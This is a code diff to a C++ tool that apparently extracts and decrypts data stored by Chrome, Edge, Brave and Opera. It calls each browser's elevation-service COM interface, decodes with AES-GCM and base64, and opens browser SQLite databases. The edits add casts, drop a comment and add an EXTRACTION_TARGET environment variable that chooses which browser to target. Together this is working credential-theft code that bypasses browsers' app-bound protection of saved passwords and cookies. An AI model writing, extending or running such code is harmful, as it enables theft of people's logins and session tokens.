@@ -124,7 +124,7 @@ std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char
     if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
     else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
     else if (browser == Browser::Brave) { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }
-    else return {}; // Opera uses DPAPI only for now
+    else return {};
 
     HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
     if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return {};
@@ -205,14 +205,14 @@ std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key
 
 static const std::string base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
-    int in_len = encoded_string.size();
+    int in_len = (int)encoded_string.size();
     int i = 0, j = 0, in_ = 0;
     unsigned char char_array_4[4], char_array_3[3];
     std::vector<unsigned char> ret;
     while (in_len-- && (encoded_string[in_] != '=') && (isalnum(encoded_string[in_]) || (encoded_string[in_] == '+') || (encoded_string[in_] == '/'))) {
         char_array_4[i++] = encoded_string[in_]; in_++;
         if (i == 4) {
-            for (i = 0; i < 4; i++) char_array_4[i] = base64_chars.find(char_array_4[i]);
+            for (i = 0; i < 4; i++) char_array_4[i] = (unsigned char)base64_chars.find(char_array_4[i]);
             char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
             char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
             char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
@@ -222,7 +222,7 @@ std::vector<unsigned char> base64_decode(std::string const& encoded_string) {
     }
     if (i) {
         for (j = i; j < 4; j++) char_array_4[j] = 0;
-        for (j = 0; j < 4; j++) char_array_4[j] = base64_chars.find(char_array_4[j]);
+        for (j = 0; j < 4; j++) char_array_4[j] = (unsigned char)base64_chars.find(char_array_4[j]);
         char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
         char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
         char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
@@ -279,6 +279,15 @@ int open_db_readonly(const std::string& path, sqlite3** db) {
 }
 
 Browser get_browser() {
+    wchar_t target_env[128];
+    if (GetEnvironmentVariableW(L"EXTRACTION_TARGET", target_env, 128)) {
+        std::wstring target(target_env);
+        if (target == L"Opera") return Browser::Opera;
+        if (target == L"OperaGX") return Browser::OperaGX;
+        if (target == L"Edge") return Browser::Edge;
+        if (target == L"Brave") return Browser::Brave;
+    }
+
     wchar_t path[MAX_PATH];
     GetModuleFileNameW(nullptr, path, MAX_PATH);
     std::wstring s(path);
